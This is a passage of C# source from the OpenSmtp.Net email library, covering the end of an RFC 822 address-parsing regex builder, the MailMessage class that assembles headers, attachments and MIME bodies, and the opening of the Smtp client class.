               Match m = EmailAddress._addressRegex.Match(email);

               //Match m = EmailAddress.oRegex.Match(email);



               this.isvalid = m.Success;

               this.domain = m.Groups["domain"].ToString();

               this.localpart = m.Groups["localpart"].ToString();

               this.mailbox = m.Groups["mailbox"].ToString();

               this.quotedstr = m.Groups["quotedstr"].ToString();

               this.name = m.Groups["quotedstr"].ToString();



               if (!this.isvalid)

               {

                   throw new MalformedAddressException("Supplied email address is invalid: " + address);

               }



               return this.isvalid;

           }



           private static System.Text.RegularExpressions.Regex _addressRegex;


           /// <summary>

           /// Initialize the regex and compiles it so that it runs a little faster.

           /// </summary>

           private static void InitializeRegex()

           {



               // for within "";

               string qtext = @"[^" + EmailAddress.Escape +

                   EmailAddress.NonAscii +

                   EmailAddress.CRList + "\"]";

               string dtext = @"[^" + EmailAddress.Escape +

                   EmailAddress.NonAscii +

                   EmailAddress.CRList +

                   EmailAddress.OpenBr +

                   EmailAddress.CloseBr + "\"]";



               string quoted_pair = " " + EmailAddress.Escape + " [^" + EmailAddress.NonAscii + "] ";



               // *********************************************

               // comments.

               // Impossible to do properly with a regex, I make do by allowing at most

               // one level of nesting.

               string ctext = @" [^" + EmailAddress.Escape +

                   EmailAddress.NonAscii +

                   EmailAddress.CRList + "()] ";



               // Nested quoted Pairs

               string Cnested = "";

               Cnested += EmailAddress.OpenParen;

               Cnested += ctext + "*";

               Cnested += "(?:" + quoted_pair + " " + ctext + "*)*";

               Cnested += EmailAddress.CloseParen;



               // A Comment Usually

               string comment = "";

               comment += EmailAddress.OpenParen;

               comment += ctext + "*";

               comment += "(?:";

               comment += "(?: " + quoted_pair + " | " + Cnested + ")";

               comment += ctext + "*";

               comment += ")*";

               comment += EmailAddress.CloseParen;



               // *********************************************

               // X is optional whitespace/comments

               string X = "";

               X += "[" + EmailAddress.Space + EmailAddress.Tab + "]*";

               X += "(?: " + comment + " [" + EmailAddress.Space + EmailAddress.Tab + "]* )*";



               // an email address atom... it's not nuclear ;)

               string atom_char = @"[^(" + EmailAddress.Space + ")<>\\@,;:\\\"." + EmailAddress.Escape + EmailAddress.OpenBr +

                   EmailAddress.CloseBr +

                   EmailAddress.Ctrl +

                   EmailAddress.NonAscii + "]";

               string atom = "";

                   atom += atom_char + "+";

                   atom += "(?!" + atom_char + ")";



               // doublequoted string, unrolled.

               string quoted_str = "(?'quotedstr'";

                   quoted_str += "\\\"";

                   quoted_str += qtext + " *";

                   quoted_str += "(?: " + quoted_pair + qtext + " * )*";

                   quoted_str += "\\\")";



               // A word is an atom or quoted string

               string word = "";

                   word += "(?:";

                   word += atom;

                   word += "|";

                   word += quoted_str;

                   word += ")";



               // A domain-ref is just an atom

               string domain_ref = atom;



               // A domain-literal is like a quoted string, but [...] instead of "..."

               string domain_lit = "";

                   domain_lit += EmailAddress.OpenBr;

                   domain_lit += "(?: " + dtext + " | " + quoted_pair + " )*";

                   domain_lit += EmailAddress.CloseBr;



               // A sub-domain is a domain-ref or a domain-literal

               string  sub_domain = "";

                   sub_domain += "(?:";

                   sub_domain += domain_ref;

                   sub_domain += "|";

                   sub_domain += domain_lit;

                   sub_domain += ")";

               sub_domain += X;



               // a domain is a list of subdomains separated by dots

               string domain = "(?'domain'";

                   domain += sub_domain;

                   domain += "(:?";

                   domain += EmailAddress.Period + " " + X + " " + sub_domain;

                   domain += ")*)";



               // a a route. A bunch of "@ domain" separated by commas, followed by a colon.

               string route = "";

                   route += "\\@ " + X + " " + domain;

                   route += "(?: , " + X + " \\@ " + X + " " + domain + ")*";

                   route += ":";

                   route += X;



               // a local-part is a bunch of 'word' separated by periods

               string local_part = "(?'localpart'";

                   local_part += word + " " + X;

                   local_part += "(?:";

                   local_part += EmailAddress.Period + " " + X + " " + word + " " + X;

                   local_part += ")*)";



               // an addr-spec is local@domain

               string addr_spec = local_part + " \\@ " + X + " " + domain;



               // a route-addr is <route? addr-spec>

               string route_addr = "";

                   route_addr += "< " + X;

                   route_addr += "(?: " + route + " )?";

                   route_addr += addr_spec;

                   route_addr += ">";



               // a phrase........

               string phrase_ctrl = @"\000-\010\012-\037";



               // Like atom-char, but without listing space, and uses phrase_ctrl.

               string phrase_char = "[^()<>\\@,;:\\\"." + EmailAddress.Escape +

                   EmailAddress.OpenBr +

                   EmailAddress.CloseBr +

                   EmailAddress.NonAscii +

                   phrase_ctrl + "]";



               string phrase = "";

                   phrase += word;

                   phrase += phrase_char;

                   phrase += "(?:";

                   phrase += "(?: " + comment + " | " + quoted_str + " )";

                   phrase += phrase_char + " *";

                   phrase += ")*";



               // A mailbox is an addr_spec or a phrase/route_addr

               string mailbox = "";

                   mailbox += X;

                   mailbox += "(?'mailbox'";

                   mailbox += addr_spec;

                   mailbox += "|";

                   mailbox += phrase + " " + route_addr;

                   mailbox += ")";



               EmailAddress._addressRegex = new Regex(mailbox,RegexOptions.Compiled | RegexOptions.IgnorePatternWhitespace);

           }



       }

   }


   namespace OpenSmtp.Mail {

   /******************************************************************************
       Copyright 2001-2005 Ian Stallings
       OpenSmtp.Net is free software; you can redistribute it and/or modify
       it under the terms of the Lesser GNU General Public License as published by
       the Free Software Foundation; either version 2 of the License, or
       (at your option) any later version.
       OpenSmtp.Net is distributed in the hope that it will be useful,
       but WITHOUT ANY WARRANTY; without even the implied warranty of
       MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
       Lesser GNU General Public License for more details.

       You should have received a copy of the Lesser GNU General Public License
       along with this program; if not, write to the Free Software
       Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
   /*******************************************************************************/


   using System;
   using System.Collections;
   using System.Collections.Specialized;
   using System.IO;
   using System.Text;

       /// <summary>
       /// This Type stores the addresses, attachments, body, subject,
       /// and properties of the email message. There can be many
       /// attachments and email addresses in each MailMessage.
       /// <seealso cref="EmailAddress"/>
       /// <seealso cref="Attachment"/>
       /// </summary>
       /// <remarks>
       /// This Type stores the addresses, attachments, body, subject,
       /// and properties of the email message. There can be many
       /// attachments and email addresses in each MailMessage.
       /// <seealso cref="EmailAddress"/>
       /// <seealso cref="Attachment"/>
       /// </remarks>
       /// <example>
       /// <code>
       ///     from            = new EmailAddress("support@OpenSmtp.com", "Support");
       ///     to              = new EmailAddress("recipient@OpenSmtp.com", "Joe Smith");
       ///     cc              = new EmailAddress("cc@OpenSmtp.com", "CC Name");
       ///
       ///     msg             = new MailMessage(from, to);
       ///     msg.AddRecipient(cc, AddressType.Cc);
       ///     msg.AddRecipient("bcc@OpenSmtp.com", AddressType.Bcc);
       ///
       ///     msg.Subject     = "Testing OpenSmtp .Net SMTP component";
       ///     msg.Body        = "Hello Joe Smith.";
       ///     msg.HtmlBody    = "<html><body>Hello Joe Smith.</body></html>";
       ///
       ///     // mail message properties
       ///     msg.Charset     = "ISO-8859-1";
       ///     msg.Priority    = MailPriority.High;
       ///     msg.Notification = true;
       ///
       ///     // add custom headers
       ///     msg.AddCustomHeader("X-CustomHeader", "Value");
       ///     msg.AddCustomHeader("X-CompanyName", "Value");
       ///
       ///     // add attachments
       ///     msg.AddAttachment(@"..\attachments\test.jpg");
       ///     msg.AddAttachment(@"..\attachments\test.htm");
       /// </code>
       /// </example>
       public class MailMessage
       {
           internal EmailAddress           from;
           internal EmailAddress           replyTo;
           internal ArrayList              recipientList;
           internal ArrayList              ccList;
           internal ArrayList              bccList;
           internal ArrayList              attachments;
           internal string                 subject;
           internal string                 body;
           internal string                 htmlBody;
           internal string                 mixedBoundary;
           internal string                 altBoundary;
           internal string                 relatedBoundary;
           internal string                 charset = "ISO-8859-1";
           internal bool                   notification;
           internal string                 priority;
           internal ArrayList              customHeaders;
           internal ArrayList              images;

           public MailMessage()
           {
               recipientList = new ArrayList();
               ccList = new ArrayList();
               bccList = new ArrayList();
               attachments = new ArrayList();
               images = new ArrayList();
               customHeaders = new ArrayList();
               mixedBoundary = MailMessage.generateMixedMimeBoundary();
               altBoundary = MailMessage.generateAltMimeBoundary();
               relatedBoundary = MailMessage.generateRelatedMimeBoundary();
            }

           /// <summary>Constructor using EmailAddress type</summary>
           /// <example>
           /// <code>
           ///     EmailAddress from   = new EmailAddress("support@OpenSmtp.com", "Support");
           ///     EmailAddress to     = new EmailAddress("recipient@OpenSmtp.com", "Joe Smith");
           ///     MailMessage msg     = new MailMessage(from, to);
           /// </code>
           /// </example>
           public MailMessage(EmailAddress sender, EmailAddress recipient):this()
           {
               from = sender;
               recipientList.Add(recipient);
           }

           /// <summary>Constructor using string email addresses</summary>
           /// <example>
           /// <code>
           ///     MailMessage msg = new MailMessage("support@OpenSmtp.com", "recipient@OpenSmtp.com");
           /// </code>
           /// </example>
           public MailMessage(string senderAddress, string recipientAddress):this(new EmailAddress(senderAddress), new EmailAddress(recipientAddress))
           {}


           // -------------------------- Properties --------------------------

           /// <value>Stores the EmailAddress to Reply-To.
           /// If no EmailAddress is specified the From address is used.</value>
           public EmailAddress ReplyTo
           {
               get { return replyTo != null ? replyTo : from; }
               set { replyTo = value; }
           }

           /// <value>Stores the EmailAddress of the sender</value>
           public EmailAddress From
           {
               get { return from; }
               set { from = value; }
           }

           /// <value>Stores the EmailAddress of the recipient</value>
           public ArrayList To
           {
               get { return recipientList; }
               set { recipientList = value; }
           }

           /// <value>Stores the subject of the MailMessage</value>
           public string Subject
           {
               get { return subject; }
               set { subject = value; }
           }

           /// <value>Stores the text body of the MailMessage</value>
           public string Body
           {
               get { return body; }
               set { body = value; }
           }

           /// <value>Stores the HTML body of the MailMessage</value>
           public string HtmlBody
           {
               get { return htmlBody; }
               set { htmlBody = value; }
           }

           /// <value>Stores Mail Priority value</value>
           /// <seealso>MailPriority</seealso>
           public string Priority
           {
               get { return priority; }
               set { priority = value; }
           }


           /// <value>Stores the Read Confirmation Reciept</value>
           public bool Notification
           {
               get { return notification; }
               set { notification = value; }
           }

           /// <value>Stores an ArrayList of CC EmailAddresses</value>
           public ArrayList CC
           {
               get { return ccList; }
               set { ccList = value; }
           }

           /// <value>Stores an ArrayList of BCC EmailAddresses</value>
           public ArrayList BCC
           {
               get { return bccList; }
               set { bccList = value; }
           }

           /// <value>Stores the character set of the MailMessage</value>
           public string Charset
           {
               get { return charset; }
               set { charset = value; }
           }

           /// <value>Stores a list of Attachments</value>
           public ArrayList Attachments
           {
               get { return attachments; }
               set { attachments = value; }
           }

           /// <value>Stores a NameValueCollection of custom headers</value>
           public ArrayList CustomHeaders
           {
               get { return customHeaders; }
               set { customHeaders = value; }
           }

           /// <value>Stores the string boundary used between MIME parts</value>
           internal string AltBoundary
           {
               get { return altBoundary; }
               set { altBoundary = value; }
           }

            /// <value>Stores the string boundary used between MIME parts</value>
            internal string MixedBoundary
            {
                get { return mixedBoundary; }
                set { mixedBoundary = value; }
            }

            /// <summary>Adds a recipient EmailAddress to the MailMessage</summary>
           /// <param name="address">EmailAddress that you want to add to the MailMessage</param>
           /// <param name="type">AddressType of the address</param>
           /// <example>
           /// <code>
           ///     MailMessage msg = new MailMessage("support@OpenSmtp.com", "recipient@OpenSmtp.com");
           ///     EmailAddress cc = new EmailAddress("cc@OpenSmtp.com");
           ///     msg.AddRecipient(cc, AddressType.Cc);
           /// </code>
           /// </example>
           public void AddRecipient(EmailAddress address, AddressType type)
           {
               try
               {
                   switch(type)
                   {
                       case AddressType.To:
                           recipientList.Add(address);
                           break;
                       case AddressType.Cc:
                           ccList.Add(address);
                           break;
                       case AddressType.Bcc:
                           bccList.Add(address);
                           break;
                   }
               }
               catch(Exception e)
               {
                   throw new SmtpException("Exception in AddRecipient: " + e.ToString());
               }
           }

           /// <summary>Adds a recipient RFC 822 formatted email address to the MailMessage</summary>
           /// <param name="address">RFC 822 formatted email address that you want to add to the MailMessage</param>
           /// <param name="type">AddressType of the email address</param>
           /// <example>
           /// <code>
           ///     MailMessage msg = new MailMessage("support@OpenSmtp.com", "recipient@OpenSmtp.com");
           ///     msg.AddRecipient("cc@OpenSmtp.com", AddressType.Cc);
           /// </code>
           /// </example>
           public void AddRecipient(string address, AddressType type)
           {
               EmailAddress email = new EmailAddress(address);
               AddRecipient(email, type);
           }


           /// <summary>Adds an Attachment to the MailMessage using a file path</summary>
           /// <param name="filepath">File path to the file you want to attach to the MailMessage</param>
           /// <example>
           /// <code>
           ///     MailMessage msg = new MailMessage("support@OpenSmtp.com", "recipient@OpenSmtp.com");
           ///     msg.AddAttachment(@"C:\file.jpg");
           /// </code>
           /// </example>
           // start added/modified by mb
           public void AddAttachment(string filepath)
           {
               AddAttachment(filepath, NewCid());
           }

           /// <summary>Adds an included image to the MailMessage using a file path</summary>
           /// <param name="filepath">File path to the file you want to attach to the MailMessage</param>
           /// <example>
           /// <code>
           ///     MailMessage msg = new MailMessage("support@OpenSmtp.com", "recipient@OpenSmtp.com");
           ///     msg.AddImage(@"C:\file.jpg");
           /// </code>
           /// </example>
           // start added/modified by mb
           public void AddImage(string filepath)
           {
               AddImage(filepath, NewCid());
           }

           public void AddImage(string filepath, string cid)
           {
               if (filepath != null)
               {
                   Attachment image = new Attachment(filepath);
                   image.contentid=cid;
                   images.Add(image);
               }
           }


           /// <summary>
           /// Generate a content id
           /// </summary>
           /// <returns></returns>
           private string NewCid()
           {
               int attachmentid=attachments.Count+images.Count+1;
               return "att"+attachmentid;
           }

           public void AddAttachment(string filepath, string cid)
           {
               if (filepath != null)
               {
                   Attachment attachment = new Attachment(filepath);
                   attachment.contentid=cid;
                   attachments.Add(attachment);
               }
           }
           // end added by mb

           /// <summary>Adds an Attachment to the MailMessage using an Attachment instance</summary>
           /// <param name="attachment">Attachment you want to attach to the MailMessage</param>
           /// <example>
           /// <code>
           ///     MailMessage msg = new MailMessage("support@OpenSmtp.com", "recipient@OpenSmtp.com");
           ///     Attachment att = new Attachment(@"C:\file.jpg");
           ///     msg.AddAttachment(att);
           /// </code>
           /// </example>
           public void AddAttachment(Attachment attachment)
           {
               if (attachment != null)
               {
                    attachments.Add(attachment);
                }
           }

           /// <summary>Adds an Attachment to the MailMessage using a provided Stream</summary>
           /// <param name="stream">stream you want to attach to the MailMessage</param>
           /// <example>
           /// <code>
           ///     MailMessage msg = new MailMessage("support@OpenSmtp.com", "recipient@OpenSmtp.com");
           ///     Attachment att = new Attachment(new FileStream(@"C:\File.jpg", FileMode.Open, FileAccess.Read), "Test Name");
           ///     msg.AddAttachment(att);
           /// </code>
           /// </example>
           public void AddAttachment(Stream stream)
           {
               if (stream != null)
               {
                    attachments.Add(stream);
                }
           }


           /// <summary>
           /// Adds an custom header to the MailMessage.
           /// NOTE: some SMTP servers will reject improper custom headers
           ///</summary>
           /// <param name="name">Name of the custom header</param>
           /// <param name="body">Value of the custom header</param>
           /// <example>
           /// <code>
           ///     MailMessage msg = new MailMessage("support@OpenSmtp.com", "recipient@OpenSmtp.com");
           ///     msg.AddCustomHeader("X-Something", "HeaderValue");
           /// </code>
           /// </example>
           public void AddCustomHeader(string name, string body)
           {
               if (name != null && body != null)
               {
                    AddCustomHeader(new MailHeader(name, body));
                }
           }

           /// <summary>
           /// Adds an custom header to the MailMessage.
           /// NOTE: some SMTP servers will reject improper custom headers
           ///</summary>
           /// <param name="mailheader">MailHeader instance</param>
           /// <example>
           /// <code>
           ///     MailMessage msg = new MailMessage("support@OpenSmtp.com", "recipient@OpenSmtp.com");
           ///     MailHeader header = new MailHeader("X-Something", "HeaderValue");
           ///     msg.AddCustomHeader(header);
           /// </code>
           /// </example>
           public void AddCustomHeader(MailHeader mailheader)
           {
               if (mailheader.name != null && mailheader.body != null)
               {
                    customHeaders.Add(mailheader);
                }
           }

           /// <summary>Populates the Body property of the MailMessage from a text file</summary>
           /// <param name="filePath">Path to the file containing the MailMessage body</param>
           /// <example>
           /// <code>
           ///     MailMessage msg = new MailMessage("support@OpenSmtp.com", "recipient@OpenSmtp.com");
           ///     msg.GetBodyFromFile(@"C:\body.txt");
           /// </code>
           /// </example>
           public void GetBodyFromFile(string filePath)
           {
               this.body = GetFileAsString(filePath);
           }

           /// <summary>Populates the HtmlBody property of the MailMessage from a HTML file</summary>
           /// <param name="filePath">Path to the file containing the MailMessage html body</param>
           /// <example>
           /// <code>
           ///     MailMessage msg = new MailMessage("support@OpenSmtp.com", "recipient@OpenSmtp.com");
           ///     msg.GetHtmlBodyFromFile(@"C:\htmlbody.html");
           /// </code>
           /// </example>
           public void GetHtmlBodyFromFile(string filePath)
           {
               // add extension
               this.htmlBody = GetFileAsString(filePath);
           }

           /// <summary>Resets all of the MailMessage properties</summary>
           /// <example>
           /// <code>
           ///     MailMessage msg = new MailMessage("support@OpenSmtp.com", "recipient@OpenSmtp.com");
           ///     msg.Reset();
           /// </code>
           /// </example>
           public void Reset()
           {
               from = null;
               replyTo = null;
               recipientList.Clear();
               ccList.Clear();
               bccList.Clear();
               customHeaders.Clear();
               attachments.Clear();
               subject = null;
               body = null;
               htmlBody = null;
               priority = null;
               mixedBoundary = null;
                altBoundary = null;
                charset = null;
               notification = false;
           }

           /// <summary>Saves the MailMessage as a RFC 822 formatted message</summary>
           /// <param name="filePath">Specifies the file path to save the message</param>
           /// <example>
           /// <code>
           ///     MailMessage msg = new MailMessage("support@OpenSmtp.com", recipient@OpenSmtp.com");
           ///     msg.Body = "body";
           ///     msg.Subject = "subject";
           ///     msg.Save(@"C:\email.txt");
           /// </code>
           /// </example>
           public void Save(string filePath)
           {
               StreamWriter sw = File.CreateText(filePath);
               sw.Write(this.ToString());
               sw.Close();
           }

           /// <summary>Returns the MailMessage as a RFC 822 formatted message</summary>
           /// <example>
           /// <code>
           ///     MailMessage msg = new MailMessage("support@OpenSmtp.com", "recipient@OpenSmtp.com");
           ///     msg.Body = "body";
           ///     msg.Subject = "subject";
           ///     string message = msg.ToString();
           /// </code>
           /// </example>
           /// <returns>Mailmessage as RFC 822 formatted string</returns>
           public override string ToString()
           {
               StringBuilder sb = new StringBuilder();

               if (ReplyTo.name != null && ReplyTo.name.Length != 0)
                {
                    sb.Append("Reply-To: \"" + MailEncoder.ConvertHeaderToQP(ReplyTo.name, charset) + "\" <" + ReplyTo.address + ">\r\n");
                }
               else
               {
                    sb.Append("Reply-To: <" + ReplyTo.address + ">\r\n");
                }

               if (from.name != null && from.name.Length != 0)
                {
                    sb.Append("From: \"" + MailEncoder.ConvertHeaderToQP(from.name, charset) + "\" <" + from.address + ">\r\n");
                }
               else
               {
                    sb.Append("From: <" + from.address + ">\r\n");
                }

               sb.Append("To: " + CreateAddressList(recipientList) + "\r\n");

               if (ccList.Count != 0)
               {
                    sb.Append("CC: " + CreateAddressList(ccList) + "\r\n");
                }

               if (subject != null && subject.Length > 0)
                {
                   StringBuilder cleanSubject = new StringBuilder(subject);
                   cleanSubject.Replace("\r\n", null);
                   cleanSubject.Replace("\n", null);

                   sb.Append("Subject: " + MailEncoder.ConvertHeaderToQP(cleanSubject.ToString(), charset) + "\r\n");
                }

               sb.Append("Date: " + DateTime.Now.ToUniversalTime().ToString("R") + "\r\n");
               sb.Append(SmtpConfig.X_MAILER_HEADER + "\r\n");

               if (notification)
               {
                   if (ReplyTo.name != null && ReplyTo.name.Length != 0)
                    {
                        sb.Append("Disposition-Notification-To: " + MailEncoder.ConvertHeaderToQP(ReplyTo.name, charset) + " <" + ReplyTo.address + ">\r\n");
                    }
                   else
                   {
                        sb.Append("Disposition-Notification-To: <" + ReplyTo.address + ">\r\n");
                    }
               }

               if (priority != null)
               {
                    sb.Append("X-Priority: " + priority + "\r\n");
                }

               if (customHeaders != null)
               {

                   for (IEnumerator i = customHeaders.GetEnumerator(); i.MoveNext();)
                   {
                       MailHeader m = (MailHeader)i.Current;

                       if (m.name.Length >= 0 && m.body.Length >= 0)
                       {
                           sb.Append(m.name + ":" + MailEncoder.ConvertHeaderToQP(m.body, charset) + "\r\n");
                       }
                       else
                       {
                           // TODO: Check if below is within RFC spec.
                           sb.Append(m.name + ":\r\n");
                       }

                   }
               }

                sb.Append("MIME-Version: 1.0\r\n");
                sb.Append(GetMessageBody());

               return sb.ToString();
           }

           /// <summary>Returns a clone of this message</summary>
           /// <example>
           /// <code>
           ///     MailMessage msg = new MailMessage("support@OpenSmtp.com", "recipient@OpenSmtp.com");
           ///     msg.Body = "body";
           ///     msg.Subject = "subject";
           ///
           ///     msg2 = msg.Copy();
           /// </code>
           /// </example>
           /// <returns>Mailmessage</returns>
           public MailMessage Copy()
           {
               return (MailMessage)this.MemberwiseClone();
           }

           /// Internal/Private methods below
           // ------------------------------------------------------

           private string GetFileAsString(string filePath)
           {
               FileStream  fin     = new FileStream(filePath, FileMode.Open, FileAccess.Read);
               byte[]      bin     = new byte[fin.Length];
               long        rdlen   = 0;
               int len;

               StringBuilder sb = new StringBuilder();

               while(rdlen < fin.Length)
               {
                   len = fin.Read(bin, 0, (int)fin.Length);
                   sb.Append(Encoding.UTF7.GetString(bin, 0, len));
                   rdlen = (rdlen + len);
               }

               fin.Close();
               return sb.ToString();
           }


           /// <summary>
           /// Determines the format of the message and adds the
           /// appropriate mime containers.
           ///
           /// This will return the html and/or text and/or
           /// embedded images and/or attachments.
           /// </summary>
           /// <returns></returns>
           private String GetMessageBody()
           {
               StringBuilder sb=new StringBuilder();

               if (attachments.Count>0)
               {
                   sb.Append("Content-Type: multipart/mixed;");
                   sb.Append("boundary=\"" + mixedBoundary + "\"");
                   sb.Append("\r\n\r\nThis is a multi-part message in MIME format.");
                   sb.Append("\r\n\r\n--" + mixedBoundary + "\r\n");
               }

               sb.Append(GetInnerMessageBody());

               if (attachments.Count>0)
               {
                   foreach (Attachment attachment in attachments)
                   {
                       sb.Append("\r\n\r\n--" + mixedBoundary + "\r\n");
                       sb.Append(attachment.ToMime());
                   }
                   sb.Append("\r\n\r\n--" + mixedBoundary + "--\r\n");
               }
               return sb.ToString();

           }

           /// <summary>
           /// Get the html and/or text and/or images.
           /// </summary>
           /// <returns></returns>

           private string GetInnerMessageBody()
           {
               StringBuilder sb=new StringBuilder();
               if (images.Count > 0)
               {
                   sb.Append("Content-Type: multipart/related;");
                   sb.Append("boundary=\"" + relatedBoundary + "\"");
                   sb.Append("\r\n\r\n--" + relatedBoundary + "\r\n");
               }

               sb.Append(GetReadableMessageBody());

               if (images.Count > 0)
               {
                   foreach (Attachment image in images)
                   {
                       sb.Append("\r\n\r\n--" + relatedBoundary + "\r\n");
                       sb.Append(image.ToMime());
                   }
                   sb.Append("\r\n\r\n--" + relatedBoundary + "--\r\n");
               }
               return sb.ToString();
           }

           private String GetReadableMessageBody() {

               StringBuilder sb=new StringBuilder();

               if (htmlBody == null)
               {
                   sb.Append(GetTextMessageBody(body, "text/plain"));
               }
               else if (body == null)
               {
                   sb.Append(GetTextMessageBody(htmlBody, "text/html"));
               }
               else
               {
                   sb.Append(GetAltMessageBody(
                       GetTextMessageBody(body, "text/plain"),
                       GetTextMessageBody(htmlBody, "text/html")));
               }

               return sb.ToString();

           }


            private string GetTextMessageBody(string messageBody, string textType)
            {
                StringBuilder sb = new StringBuilder();

                sb.Append("Content-Type: " + textType + ";\r\n");
                sb.Append(" charset=\""+ charset + "\"\r\n");
                sb.Append("Content-Transfer-Encoding: quoted-printable\r\n\r\n");
                sb.Append(MailEncoder.ConvertToQP(messageBody, charset));

                return sb.ToString();
            }

            private string GetAltMessageBody(string messageBody1, string messageBody2)
            {
                StringBuilder sb = new StringBuilder();

                sb.Append("Content-Type: multipart/alternative;");
                sb.Append("boundary=\"" + altBoundary + "\"");

                sb.Append("\r\n\r\nThis is a multi-part message in MIME format.");

                sb.Append("\r\n\r\n--" + altBoundary + "\r\n");
                sb.Append(messageBody1);
                sb.Append("\r\n\r\n--" + altBoundary + "\r\n");
                sb.Append(messageBody2);
                sb.Append("\r\n\r\n--" + altBoundary + "--\r\n");

                return sb.ToString();
            }


           // creates comma separated address list from to: and cc:
           private string CreateAddressList(ArrayList msgList)
           {
               StringBuilder sb = new StringBuilder();

               int index = 1;
               int msgCount = msgList.Count;

               for (IEnumerator i = msgList.GetEnumerator(); i.MoveNext(); index++)
               {
                   EmailAddress a = (EmailAddress)i.Current;

                   // if the personal name exists, add it to the address sent. IE: "Ian Stallings" <istallings@mail.com>
                   if (a.name != null && a.name.Length > 0)
                   {
                       sb.Append("\"" + MailEncoder.ConvertHeaderToQP(a.name, charset) + "\" <" + a.address + ">");
                   }
                   else
                   {
                       sb.Append("<" + a.address + ">");
                   }

                   // if it's not the last address add a semi-colon:
                   if (msgCount != index)
                   {
                       sb.Append(",");
                   }
               }

               return sb.ToString();
           }

           private static string generateMixedMimeBoundary()
           {
               // Below generates uniqe boundary for each message. These are used to separate mime parts in a message.
               return "Part." + Convert.ToString(new Random(unchecked((int)DateTime.Now.Ticks)).Next()) + "." + Convert.ToString(new Random(~unchecked((int)DateTime.Now.Ticks)).Next());
           }

            private static string generateAltMimeBoundary()
            {
                // Below generates uniqe boundary for each message. These are used to separate mime parts in a message.
                return "Part." + Convert.ToString(new Random(~unchecked((int)DateTime.Now.AddDays(1).Ticks)).Next()) + "." + Convert.ToString(new Random(unchecked((int)DateTime.Now.AddDays(1).Ticks)).Next());
            }

           private static string generateRelatedMimeBoundary()
           {
               // Below generates uniqe boundary for each message. These are used to separate mime parts in a message.
               return "Part." + Convert.ToString(new Random(~unchecked((int)DateTime.Now.AddDays(2).Ticks)).Next()) + "." + Convert.ToString(new Random(unchecked((int)DateTime.Now.AddDays(1).Ticks)).Next());
           }

        }
   }


   namespace OpenSmtp.Mail
   {

   /******************************************************************************
       Copyright 2001-2005 Ian Stallings
       OpenSmtp.Net is free software; you can redistribute it and/or modify
       it under the terms of the Lesser GNU General Public License as published by
       the Free Software Foundation; either version 2 of the License, or
       (at your option) any later version.

       OpenSmtp.Net is distributed in the hope that it will be useful,
       but WITHOUT ANY WARRANTY; without even the implied warranty of
       MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
       Lesser GNU General Public License for more details.

       You should have received a copy of the Lesser GNU General Public License
       along with this program; if not, write to the Free Software
       Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
   /*******************************************************************************/


   using System;
   using System.IO;
   using System.Net;
   using System.Net.Sockets;
   using System.Text;
   using System.Threading;
   using System.Collections;

       /// <summary>
       /// This Type sends a MailMessage using SMTP
       /// <seealso cref="EmailAddress"/>
       /// <seealso cref="MailMessage"/>
       /// <seealso cref="SmtpConfig"/>
       /// </summary>
       /// <example>
       /// <code>
       ///     from = new EmailAddress("support@OpenSmtp.com", "Support");
       ///     to = new EmailAddress("recipient@OpenSmtp.com", "Joe Smith");
       ///
       ///     msg = new MailMessage(from, to);
       ///     msg.Subject = "Testing OpenSmtp .Net SMTP component";
       ///     msg.Body = "Hello Joe Smith.";
       ///
       ///     Smtp smtp = new Smtp("localhost", 25);
       ///     smtp.SendMail(msg);
       /// </code>
       /// </example>
       public class Smtp
       {
           internal TcpClient  tcpc;
           internal string     host;
           internal int        port = 25;
           internal string     username;
           internal string     password;

           internal int        sendTimeout = 50000;
           internal int        recieveTimeout = 50000;
           internal int        receiveBufferSize = 1024;
           internal int        sendBufferSize = 1024;

           /// <summary>Default constructor</summary>
           /// <example>
           /// <code>
           ///     Smtp smtp = new Smtp();
           ///     smtp.Host = "mail.OpenSmtp.com";
           ///     smtp.Port = 25;
           /// </code>
           /// </example>
           public Smtp()
           {}


           /// <summary>Constructor specifying a host and port</summary>
           /// <example>
           /// <code>
           ///     Smtp smtp = new Smtp("mail.OpenSmtp.com", 25);
           /// </code>
           /// </example>
           public Smtp(string host, int port)
           {
               this.host = host;
               this.port = port;
           }

           /// <summary>Constructor specifying a host, username and password</summary>
           /// <example>
           /// <code>
           ///     Smtp smtp = new Smtp("mail.OpenSmtp.com", "login", "pwd");
           /// </code>
           /// </example>
           public Smtp(string host, string username, string password)
           {
               this.Host = host;
               this.Port = port;
               this.Username = username;
               this.Password = password;
           }

           /// <summary>Constructor specifying a host, username, password and port</summary>
           /// <example>
           /// <code>
           ///     Smtp smtp = new Smtp("mail.OpenSmtp.com", "login", "pwd", 25);
           /// </code>
           /// </example>
           public Smtp(string host, string username, string password, int port)
           {
               this.Host = host;
               this.Port = port;
               this.Username = username;
               this.Password = password;
           }

           //========================================================================
           // PROPERTIES
           //========================================================================

           /// <value>Stores the Host address SMTP server. The default value is "localhost"</value>
           /// <example>"mail.OpenSmtp.com"</example>
           public string Host
           {
               get { return(this.host); }
               set { this.host = value; }
           }

           /// <value>Stores the Port of the host SMTP server. The default value is port 25</value>
           public int Port
           {
               get { return(this.port); }
               set { this.port = value; }
           }

           /// <value>Stores send timeout for the connection to the SMTP server in milliseconds.
           /// The default value is 10000 milliseconds.</value>
           public int SendTimeout
           {
               get { return this.sendTimeout; }
               set { sendTimeout = value; }
           }

           /// <value>Stores send timeout for the connection to the SMTP server in milliseconds.
           /// The default value is 10000 milliseconds.</value>
           public int RecieveTimeout
           {
               get { return this.recieveTimeout; }
               set { recieveTimeout = value; }
           }

           /// <value>Stores the username used to authenticate on the SMTP server.
           /// If no authentication is needed leave this value blank.</value>
           public string Username
           {
               get { return this.username; }
               set { username = value; }
           }

           /// <value>Stores the password used to authenticate on the SMTP server.
           /// If no authentication is needed leave this value blank.</value>
           public string Password
           {
               get { return this.password; }
               set { password = value; }
           }

           //========================================================================
           // EVENTS
           //========================================================================

           /// <value>Event that fires when connected with target SMTP server.</value>
           public event EventHandler Connected;

           /// <value>Event that fires when dicconnected with target SMTP server.</value>
           public event EventHandler Disconnected;

           /// <value>Event that fires when authentication is successful.</value>
           public event EventHandler Authenticated;

           /// <value>Event that fires when message transfer has begun.</value>
           public event EventHandler StartedMessageTransfer;

           /// <value>Event that fires when message transfer has ended.</value>
           public event EventHandler EndedMessageTransfer;

           internal void OnConnect(EventArgs e)
           {
               if (Connected != null)
